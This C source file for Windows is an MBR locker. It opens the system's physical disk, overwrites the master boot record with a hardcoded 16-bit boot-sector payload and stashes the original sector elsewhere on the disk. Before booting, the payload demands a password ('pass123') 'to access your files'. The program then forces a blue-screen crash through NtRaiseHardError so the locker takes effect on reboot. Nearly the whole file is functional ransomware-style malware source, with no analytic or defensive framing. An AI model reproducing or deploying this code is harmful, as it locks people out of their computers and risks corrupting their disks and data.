#include <stdio.h>
#include <Windows.h>

#define SECTOR_SIZE 512
#define MBR_SIG "\x55\xAA"

#pragma comment(lib, "ntdll.lib")

/*
1. Acesso ao HDD -> CreateFileA
2. Ler a MBR -> ReadFileA
3. Verificar a assinatura de bootloader
4. Escrever c√≥digo na MBR
5. Salvar MBR original
*/

unsigned char bootloader[] = "\x4D\x42\x52\x43\x72\x79\x70\x74\x0A\x0D\x00\x0B\x50\x6C\x65\x61\x73\x65\x20\x70\x72"
"\x6F\x76\x69\x64\x65\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x20\x74\x6F\x20\x61\x63\x63\x65\x73\x73\x20\x79\x6F\x75"
"\x72\x20\x66\x69\x6C\x65\x73\x3A\x20\x00\x2F\x57\x72\x6F\x6E\x67\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x2E\x00\x10"
"\x43\x6F\x72\x72\x65\x63\x74\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x2E\x20\x42\x6F\x6F\x74\x69\x6E\x67\x20\x6E\x6F"
"\x77\x2E\x00\x1F\x70\x61\x73\x73\x31\x32\x33\x07\x00\x31\xC0\x31\xDB\x31\xC9\x31\xD2\x8E\xC0\x8E\xD8\xB4\x13\x8A"
"\x0E\x0B\x7C\xB0\x01\xBB\x0F\x00\x31\xD2\xBD\x00\x7C\xCD\x10\xB4\x13\x8A\x0E\x3B\x7C\xB0\x01\xBB\x0F\x00\x31\xD2"
"\xBD\x0C\x7C\xCD\x10\x31\xF6\x3B\x36\x74\x7C\x74\x19\xB4\x01\xCD\x16\x74\xF4\x31\xC0\xCD\x16\xB4\x0E\x31\xDB\xCD"
"\x10\x3A\x84\x6D\x7C\x75\x19\x46\xEB\xE1\xB4\x13\x8A\x0E\x6C\x7C\xB0\x01\xBB\x0F\x00\x31\xD2\xB6\x04\xBD\x4D\x7C"
"\xCD\x10\xEB\x16\xB4\x13\x8A\x0E\x4C\x7C\xB0\x01\xBB\x0F\x00\x31\xD2\xB6\x04\xBD\x3C\x7C\xCD\x10\xEB\x14\xB4\x02"
"\xB0\x02\xB5\x00\xB1\x02\xB6\x00\xB2\x80\xBB\x00\x7E\xCD\x13\xE9\xF9\x00\xEB\xFE\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x55\xAA\xB4\x03\xB0\x01\xB5\x00\xB1\x01\xB6\x00\xB2\x80\xBB"
"\x00\x80\xCD\x13\xEB\x00\xEA\x00\x00\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN Client, PBOOLEAN WasEnabled);
NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PVOID Parameters, ULONG ResponseOption, PULONG ResponsePointer);

int main() {
	HANDLE hDisk;
	unsigned char cBackup[SECTOR_SIZE*2];
	unsigned char cInfected[SECTOR_SIZE*2];
	unsigned char cXor[SECTOR_SIZE*2];

	DWORD bytesRead;
	DWORD bytesWritten;
	BOOLEAN privilegeOld;
	ULONG response;
	int i;

	hDisk = CreateFile(L"\\\\.\\PhysicalDrive0", 
		GENERIC_READ | GENERIC_WRITE, 
		FILE_SHARE_READ | FILE_SHARE_WRITE, 
		NULL, 
		OPEN_EXISTING, 
		NULL, 
		NULL);

	if (hDisk == INVALID_HANDLE_VALUE) {
		printf("Failure to read disk.\n");
		printf("%d", GetLastError());
		exit(1);
	}
	
	SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);

	if (!ReadFile(hDisk, cBackup, SECTOR_SIZE, &bytesRead, NULL)) {
		printf("Failed to read first sector.\n");
		CloseHandle(hDisk);
		exit(1);
	}

	if (memcmp(&cBackup[SECTOR_SIZE - 2], MBR_SIG, 2)) {
		printf("Signature does not check out.\n");
		CloseHandle(hDisk);
		exit(1);
	}

	memcpy(cInfected, bootloader, SECTOR_SIZE*2);
	
	// Create a XOR encryption
	/*for (i = 0; i < SECTOR_SIZE; i++) {
		cXor[i] = cBackup[i] ^ 0xFF;
	} */

	SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);

	if (!WriteFile(hDisk, &cInfected, SECTOR_SIZE*2, &bytesWritten, NULL)) {
		printf("Failed to write infected bootloader.\n");
		exit(1);
	}

	if (!WriteFile(hDisk, &cBackup, SECTOR_SIZE*2, &bytesWritten, NULL)) {
		printf("Failed to write backuped bootloader.\n");
		exit(1);
	}

	RtlAdjustPrivilege(19, TRUE, FALSE, &privilegeOld);
	NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &response);

	return(0);
}
